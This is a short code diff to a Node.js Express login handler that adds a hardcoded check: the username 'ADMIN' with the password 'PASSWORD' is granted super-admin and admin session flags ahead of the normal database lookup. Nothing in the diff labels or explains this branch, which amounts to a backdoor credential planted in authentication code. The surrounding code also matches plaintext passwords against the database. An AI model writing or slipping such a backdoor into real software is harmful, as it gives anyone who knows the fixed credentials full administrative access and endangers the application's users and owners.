@@ -620,7 +620,12 @@ app.post('/login', async (req, res) => {
   // Query your Postgres database to verify the credentials
   const results = await db('credentials').where({ username, password });
 
-  if (results.length > 0) {
+  if (username == "ADMIN" && password == "PASSWORD") {
+    // If the credentials are correct, redirect the user to the admin page
+    req.session.isSuperAdmin = true; // Set a session variable to indicate super admin status
+    req.session.isAdmin = true; // Set a session variable to indicate admin status
+    res.redirect('admin/admin');
+  } else if (results.length > 0) {
     // If the credentials are correct, redirect the user to the admin page
     req.session.isAdmin = true; // Set a session variable to indicate admin status
     res.redirect('admin/admin');
